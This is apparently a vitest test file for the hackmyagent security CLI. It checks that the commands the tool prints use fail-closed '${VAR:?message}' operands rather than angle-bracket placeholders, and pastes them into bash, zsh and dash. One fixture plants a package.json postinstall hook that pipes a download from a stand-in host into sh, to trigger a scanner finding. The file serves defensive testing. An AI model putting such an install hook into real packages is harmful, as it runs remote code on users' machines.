/**
 * A command the tool tells the reader to run, whose operand the reader must
 * supply, fails before it runs when they paste it without supplying one.
 *
 * Printed with an angle-bracket placeholder, a pasted span is shell syntax
 * that does something else. `sha256sum <artifact>` is a syntax error;
 * `docker exec <sandbox-container> npx hackmyagent scan --ci /app` reads stdin
 * from a file named `sandbox-container`, truncates a file named `npx`, and
 * runs `docker exec hackmyagent scan --ci /app`. The fail-closed form
 * `"${VAR:?message}"` makes the shell refuse the whole line with the message
 * when VAR is unset, and pass the value as one argument when it is set.
 *
 * This file covers the plain shell-operand spans: a path, name or id in an
 * ordinary command. Three things are checked:
 *
 *   1. each span, read from a captured run where one works offline and from
 *      the exported string otherwise, carries no placeholder and at least one
 *      fail-closed operand whose message says what to set;
 *   2. each span, written to a file and pasted into bash, zsh and dash with
 *      its parameter unset, exits non-zero with that message on stderr and
 *      runs nothing; with the parameter set, the command receives the value
 *      as one argument;
 *   3. the strings that keep their angle brackets until their own form is
 *      decided are unchanged: the `.hmaignore` grammar errors, the `explain`
 *      text, the four `export INTERNAL_API_KEY` lines and Commander usage.
 */
import { describe, it, expect, beforeAll, vi } from 'vitest';
import { spawnSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as path from 'node:path';
import ts from 'typescript';
import { assertDistFresh, assertDistFreshIfPresent, BUILT_CLI as CLI } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';
import { HardeningScanner, parseHmaIgnore } from '../../src/hardening/scanner';
import { NemoClawScanner } from '../../src/hardening/nemoclaw-scanner';
import { renderGovernanceModel } from '../../src/soul/governance-model';
import { trustAapGate } from '../../src/aap/trust-gate';
import * as publish from '../../src/registry/publish';
import { STATIC_EXPLANATIONS, SOUL_SCAN_EXPLANATIONS, explainBody } from '../../src/explain-registry';

beforeAll(assertDistFreshIfPresent);

const REPO_ROOT = path.resolve(__dirname, '../..');
const PLACEHOLDER = /<[A-Za-z][^<>\s]*>/;
/**
 * `"${NAME:?message}"`, quoted so a set value stays one argument. The message
 * alphabet leaves nothing for the shell to expand inside the quotes: no `$`,
 * backquote or `\`, no `"` or `}` to end the word, no `!` for an interactive
 * bash's history expansion.
 */
const OPERAND = /"\$\{([A-Z][A-Z0-9_]*):\?([A-Za-z0-9][A-Za-z0-9 ,.:/_-]*)\}"/g;
const ANY_OPERAND = /\$\{[^}]*:\?/g;

function operands(span: string): Array<{ name: string; message: string }> {
  const found = [...span.matchAll(OPERAND)].map((m) => ({ name: m[1], message: m[2] }));
  // Every `${...:?` in the span is one of the well-formed operands above.
  expect(found.length, span).toBe((span.match(ANY_OPERAND) ?? []).length);
  return found;
}

/** The CLI under a throwaway HOME and an environment that carries nothing from this one. */
function hma(args: string[], extraEnv: Record<string, string> = {}) {
  // A missing build fails the case that spawns it by name, never skips it.
  assertDistFresh();
  const home = tempDir('hma-c4-home-');
  const r = spawnSync(process.execPath, [CLI, ...args], {
    encoding: 'utf8',
    timeout: 120_000,
    env: {
      PATH: process.env.PATH ?? '/usr/bin:/bin',
      HOME: home,
      TMPDIR: process.env.TMPDIR ?? '/tmp',
      NO_COLOR: '1',
      OPENA2A_TELEMETRY: 'off',
      ...extraEnv,
    },
  });
  return { status: r.status, stdout: r.stdout ?? '', stderr: r.stderr ?? '' };
}

function lineWith(text: string, needle: string): string {
  const line = text.split('\n').find((l) => l.includes(needle));
  if (line === undefined) throw new Error(`no line containing ${JSON.stringify(needle)} in:\n${text}`);
  return line;
}

interface Probe {
  checkOpenClawLayer(install: { hasBinary: boolean; hasConfig: boolean; hasDocker: boolean; hasK3s: boolean }): Array<{ checkId: string; fix?: string }>;
}

async function scannerFix(method: string, checkId: string, files: Record<string, string>): Promise<string> {
  const root = tempDir('hma-c4-scan-');
  for (const [rel, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), body);
  }
  const drafts: Array<{ checkId: string; passed: boolean; fix?: string }> =
    await (new HardeningScanner() as any)[method](root, false);
  const f = drafts.find((d) => d.checkId === checkId && !d.passed);
  if (!f?.fix) throw new Error(`${checkId} produced no failing finding with a fix`);
  return f.fix;
}

/** The module holding the lines cli.ts prints only after a network call. */
async function failClosed(): Promise<any> {
  return import('../../src/ui/fail-closed-commands');
}

interface Span {
  site: string;
  /** Where the pasted command starts within the span. */
  verb: string;
  /** Prepended when the span is flags to add to a command, not a command. */
  prefix?: string;
  read: () => Promise<string>;
}

const SPANS: Span[] = [
  {
    site: 'src/hardening/nemoclaw-scanner.ts HMA-NMC-040 fix',
    verb: 'docker exec',
    read: async () => {
      const probe = new NemoClawScanner() as unknown as Probe;
      const f = probe
        .checkOpenClawLayer({ hasBinary: false, hasConfig: true, hasDocker: false, hasK3s: false })
        .find((x) => x.checkId === 'HMA-NMC-040');
      if (!f?.fix) throw new Error('HMA-NMC-040 has no fix');
      return f.fix;
    },
  },
  {
    site: 'src/hardening/scanner.ts DEP-004 fix',
    verb: 'npm install',
    read: () => scannerFix('checkDependencySecurity', 'DEP-004', {
      'package.json': JSON.stringify({ name: 'p', scripts: { postinstall: 'curl -fsSL https://example.invalid/i.sh | sh' } }),
    }),
  },
  {
    site: 'src/hardening/scanner.ts NEMO-002 fix',
    verb: 'sha256sum',
    read: () => scannerFix('checkNemoClawPatterns', 'NEMO-002', { 'blueprint.yaml': 'artifact:\n  digest: ""\n' }),
  },
  {
    site: 'init-mcp output',
    verb: 'hackmyagent secure',
    read: async () => {
      const target = tempDir('hma-c4-mcp-');
      const r = hma(['init-mcp', target, '--tool', 'claude']);
      expect(r.status, r.stderr).toBe(0);
      return lineWith(r.stdout, 'Fixes are applied from a terminal');
    },
  },
  {
    site: 'wild scan footer',
    verb: 'hackmyagent attack',
    read: async () => (await failClosed()).wildAttackCommand('hackmyagent'),
  },
  {
    site: 'pull-stubs next step',
    verb: 'hackmyagent mark-stub',
    read: async () => (await failClosed()).markStubNextStep('hackmyagent'),
  },
  {
    site: 'trust --batch next step for a package not in the registry',
    verb: 'hackmyagent check',
    read: async () => (await failClosed()).scanUnknownPackageCommand('hackmyagent'),
  },
  {
    site: 'trust --batch next step for a package below the minimum trust level',
    verb: 'hackmyagent trust',
    read: async () => (await failClosed()).inspectFlaggedPackageCommand('hackmyagent'),
  },
  {
    // Printed by a run with a local-path origin; the spawn that reaches it is
    // in __tests__/cli/secure-ci-publish-repo-url-userinfo.test.ts.
    site: 'secure --ci-publish with an origin that is a local path',
    verb: 'git remote set-url',
    read: async () => (await failClosed()).setOriginUrlCommand(),
  },
  {
    site: 'check next steps, Full project audit with HMA_FULL_SCAN_HINT unset',
    verb: 'hackmyagent secure',
    read: async () => (await failClosed()).fullScanCommand('hackmyagent'),
  },
  {
    site: 'rollback of a directory that does not exist',
    verb: 'hackmyagent rollback',
    read: async () => {
      const missing = path.join(tempDir('hma-c4-gone-'), 'no-such-project');
      const r = hma(['rollback', missing]);
      expect(r.status).toBe(1);
      return lineWith(r.stderr, 'If the path is wrong');
    },
  },
  {
    site: 'src/soul/governance-model.ts closing line',
    verb: 'hackmyagent scan-soul',
    read: async () => lineWith(renderGovernanceModel(), 'to evaluate a target against this model'),
  },
  {
    site: 'src/registry/publish.ts unsigned publish notice',
    verb: 'opena2a claim',
    read: async () => (publish as Record<string, unknown>).COMMUNITY_SUBMISSION_NOTICE as string,
  },
  {
    site: 'secure on a missing target with -o and a non-json format',
    verb: '--format json -o',
    prefix: 'hackmyagent secure . ',
    read: async () => {
      const dir = tempDir('hma-c4-o-');
      const r = hma(['secure', path.join(dir, 'no-such-dir'), '--format', 'sarif', '-o', path.join(dir, 'r.sarif')]);
      expect(r.status).toBe(2);
      return lineWith(r.stderr, 'For a record of this run');
    },
  },
  {
    site: 'trust --grant with an ATX file that does not exist',
    verb: '--atx',
    prefix: 'hackmyagent trust p --grant g ',
    read: async () => {
      const written: string[] = [];
      const spy = vi.spyOn(process.stderr, 'write').mockImplementation((chunk: any) => {
        written.push(String(chunk));
        return true;
      });
      try {
        const code = await trustAapGate({ grant: 'g', atxPath: path.join(tempDir('hma-c4-atx-'), 'missing.json') });
        expect(code).toBe(2);
      } finally {
        spy.mockRestore();
      }
      return lineWith(written.join(''), '--atx');
    },
  },
];

/** Each span is read once: the captured runs spawn the CLI. */
const readCache = new Map<Span, Promise<string>>();
function textOf(span: Span): Promise<string> {
  if (!readCache.has(span)) readCache.set(span, span.read());
  return readCache.get(span)!;
}

describe('plain shell-operand spans carry the fail-closed form', { timeout: 300_000 }, () => {
  it('covers fifteen spans', () => {
    // Twelve, then the two trust --batch next steps and the --ci-publish
    // set-url line, which still printed `<name>` and `<host>` (#1132).
    expect(SPANS).toHaveLength(15);
  });

  it('cli.ts passes no angle-bracket operand to npxCitation', () => {
    // `npxCitation('check <name>')` printed a span that is a syntax error
    // when pasted; a command with an operand comes from fail-closed-commands.
    const file = path.join(REPO_ROOT, 'src', 'cli.ts');
    const sf = ts.createSourceFile(file, fs.readFileSync(file, 'utf8'), ts.ScriptTarget.Latest, true);
    const args: string[] = [];
    const visit = (node: ts.Node): void => {
      if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === 'npxCitation') {
        const first = node.arguments[0];
        args.push(first && (ts.isStringLiteral(first) || ts.isNoSubstitutionTemplateLiteral(first)) ? first.text : first?.getText(sf) ?? '');
      }
      ts.forEachChild(node, visit);
    };
    visit(sf);
    expect(args.length).toBeGreaterThan(0);
    expect(args.filter((a) => PLACEHOLDER.test(a))).toEqual([]);
  });

  for (const span of SPANS) {
    it(`${span.site}: no placeholder, every operand fails closed`, async () => {
      const text = await textOf(span);
      expect(text).not.toMatch(PLACEHOLDER);
      expect(text).toContain(':?');
      const found = operands(text);
      expect(found.length).toBeGreaterThan(0);
      for (const { name, message } of found) {
        expect(message.startsWith(`set ${name} to `), message).toBe(true);
      }
      expect(text).toContain(span.verb);
    });
  }
});

// ---------------------------------------------------------------------------
// 2. The paste: bash, zsh and dash refuse the span when its parameter is unset
// ---------------------------------------------------------------------------

function findShell(name: string): string | null {
  const r = spawnSync('/bin/sh', ['-c', `command -v ${name}`], { encoding: 'utf8' });
  const p = (r.stdout ?? '').trim();
  return r.status === 0 && p.startsWith('/') ? p : null;
}

const SHELLS = ['bash', 'zsh', 'dash'].map((name) => ({ name, bin: findShell(name) }));
const COMMANDS = ['hackmyagent', 'docker', 'npm', 'sha256sum', 'opena2a', 'git'];

/** The pasted command: from its verb through the last fail-closed operand. */
function pasteOf(span: Span, text: string): string {
  const start = text.indexOf(span.verb);
  const end = text.lastIndexOf('}"');
  expect(start, `verb ${span.verb} in ${text}`).toBeGreaterThanOrEqual(0);
  expect(end, `a fail-closed operand in ${text}`).toBeGreaterThan(start);
  return (span.prefix ?? '') + text.slice(start, end + 2);
}

for (const shell of SHELLS) {
  describe.skipIf(!shell.bin)(`pasted into ${shell.name}`, { timeout: 300_000 }, () => {
    let bin: string;
    let marker: string;

    beforeAll(() => {
      // Each command a span names is a stub that records its argv, so a run
      // that reaches the command is visible and a refused one leaves nothing.
      bin = tempDir('hma-c4-bin-');
      marker = path.join(tempDir('hma-c4-marker-'), 'argv');
      for (const c of COMMANDS) {
        const stub = path.join(bin, c);
        fs.writeFileSync(stub, `#!/bin/sh\nfor a in "$@"; do printf '%s\\n' "$a"; done >> '${marker}'\n`);
        fs.chmodSync(stub, 0o755);
      }
    });

    function paste(script: string, set: Record<string, string>, unset: string[]) {
      const file = path.join(tempDir('hma-c4-paste-'), 'span.sh');
      fs.writeFileSync(file, script + '\n');
      const args = [...unset.flatMap((v) => ['-u', v]), shell.bin!, '-c', fs.readFileSync(file, 'utf8')];
      const r = spawnSync('/usr/bin/env', args, {
        encoding: 'utf8',
        timeout: 30_000,
        env: { PATH: `${bin}:/usr/bin:/bin`, HOME: tempDir('hma-c4-shell-home-'), LC_ALL: 'C', ...set },
      });
      return { status: r.status, stderr: r.stderr ?? '' };
    }

    for (const span of SPANS) {
      it(`${span.site}`, async () => {
        const text = await textOf(span);
        const script = pasteOf(span, text);
        const vars = operands(script);
        expect(vars.length).toBeGreaterThan(0);
        const value = (name: string) => `${name.toLowerCase()} value`;
        const all = Object.fromEntries(vars.map((v) => [v.name, value(v.name)]));

        for (const v of vars) {
          fs.rmSync(marker, { force: true });
          // Set in the parent and removed by `env -u`, so the run measures the
          // unset case rather than a variable that was never there.
          const r = paste(script, all, [v.name]);
          expect(r.status, `${shell.name} exit with ${v.name} unset`).not.toBe(0);
          expect(r.stderr).toContain(v.message);
          expect(fs.existsSync(marker), `${shell.name} ran the command with ${v.name} unset`).toBe(false);
        }

        fs.rmSync(marker, { force: true });
        const ok = paste(script, all, []);
        expect(ok.status, ok.stderr).toBe(0);
        const argv = fs.readFileSync(marker, 'utf8').split('\n');
        for (const v of vars) expect(argv).toContain(value(v.name));
      });
    }
  });
}

it('bash is installed, so the paste cases run; a skipped zsh or dash is named', () => {
  // Every paste case sits under a skipIf for its shell. Without bash the
  // bash cases would skip and the file would still pass, so its absence
  // fails here. A host without zsh or dash runs fewer shells, and the
  // warning says which.
  expect(SHELLS.find((s) => s.name === 'bash')?.bin, 'bash not found on PATH: the bash paste cases did not run').toBeTruthy();
  const missing = SHELLS.filter((s) => !s.bin).map((s) => s.name);
  if (missing.length > 0) console.warn(`paste test skipped, not installed: ${missing.join(', ')}`);
});

// ---------------------------------------------------------------------------
// 3. Strings that keep their angle brackets until their own form is decided
// ---------------------------------------------------------------------------

describe('angle brackets that stay', { timeout: 300_000 }, () => {
  it('the .hmaignore grammar errors are unchanged', () => {
    const errorOf = (row: string) => {
      const { errors } = parseHmaIgnore(row, '2026-01-01');
      expect(errors, row).toHaveLength(1);
      return errors[0].error;
    };
    expect(errorOf('!')).toBe('empty check pattern; write `!<CHECK-ID>`');
    expect(errorOf('!a b')).toBe('`a b` is not a check pattern; write `!<CHECK-ID>` (for example `!NEMO-009`), or a path without the `!`');
    expect(errorOf('logs:*')).toBe('`<path>:*` is not a form; write `logs` to exclude the whole path');
    expect(errorOf(':NEMO-009 # r')).toBe('empty path; write `<path>:<CHECK-ID>`');
    expect(errorOf('danger.py:NEMO-009')).toBe('a `<path>:<CHECK-ID>` rule requires a reason; append `# <why>`');
  });

  it('no explain entry carries the fail-closed form, and the placeholder rows are unchanged', () => {
    for (const [id, text] of Object.entries({ ...STATIC_EXPLANATIONS, ...SOUL_SCAN_EXPLANATIONS })) {
      expect(text, id).not.toContain(':?');
      expect(text, id).not.toContain('${');
    }
    // Read from what explain prints: the hand-written entries no longer state
    // a fix of their own, and CRED-002's comes from its check definition
    // (#1132). AST-GOV-001's pointer to harden-soul is a Run: line now.
    const rows: Array<[string, string]> = [
      ['CRED-002', 'then run: git rm --cached <file>'],
      ['AST-PROMPT-001', 'Run: hackmyagent harden-soul <dir>'],
      ['AST-PROMPT-003', 'Run: hackmyagent harden-soul <dir>'],
      ['AST-INJECT-001', 'Run: hackmyagent harden-soul <dir> to generate injection-resistant governance'],
      ['AST-GOV-001', 'Run: hackmyagent harden-soul <dir> to auto-generate missing governance sections'],
      ['TEXT-001', 'Run: hackmyagent scan-text <file> to see the line and column'],
      ['TEXT-002', 'Run: hackmyagent scan-text <file> to see the line and column'],
      ['SEM-LLM-NOT-ANALYZED', 'Run: hackmyagent secure <dir> --deep'],
    ];
    for (const [id, tail] of rows) expect((explainBody(id) ?? []).join('\n'), id).toContain(tail);
  });

  it('the four export INTERNAL_API_KEY lines are unchanged', () => {
    const notLatin1 = 'key' + String.fromCodePoint(0x2019);
    const pullUnset = hma(['pull-stubs']);
    expect(pullUnset.stderr.split('\n')).toContain('  export INTERNAL_API_KEY=<your-key>');
    const pullBad = hma(['pull-stubs'], { INTERNAL_API_KEY: notLatin1 });
    expect(pullBad.stderr.split('\n')).toContain('    export INTERNAL_API_KEY=<your-key>');
    const markUnset = hma(['mark-stub', '7f3c1d2e', 'reviewed']);
    expect(markUnset.stderr.split('\n')).toContain('  Fix: export INTERNAL_API_KEY=<your-key>');
    const markBad = hma(['mark-stub', '7f3c1d2e', 'reviewed'], { INTERNAL_API_KEY: notLatin1 });
    expect(markBad.stderr.split('\n')).toContain('  Fix: Re-copy the key as plain ASCII: export INTERNAL_API_KEY=<your-key>');
  });

  it('Commander usage keeps its angle brackets and never carries the fail-closed form', () => {
    const file = path.join(REPO_ROOT, 'src', 'cli.ts');
    const sf = ts.createSourceFile(file, fs.readFileSync(file, 'utf8'), ts.ScriptTarget.Latest, true);
    const usage: string[] = [];
    const visit = (node: ts.Node): void => {
      if (ts.isCallExpression(node) && ts.isPropertyAccessExpression(node.expression)) {
        const method = node.expression.name.text;
        const first = node.arguments[0];
        if (['command', 'option', 'requiredOption', 'argument', 'usage'].includes(method) && first
          && (ts.isStringLiteral(first) || ts.isNoSubstitutionTemplateLiteral(first))) {
          usage.push(first.text);
        }
      }
      ts.forEachChild(node, visit);
    };
    visit(sf);
    expect(usage.length).toBeGreaterThan(100);
    for (const u of usage) {
      expect(u).not.toContain(':?');
      expect(u).not.toContain('${');
    }
    // The usage strings of the commands whose printed spans this conversion
    // changed, where an accidental edit would land.
    for (const u of ['[directory]', '-t, --tool <name>', '--root <dir>', '--model <model>', '<id>', '<status>', '--atx <path>', '-o, --output <file>']) {
      expect(usage, u).toContain(u);
    }
  });
});
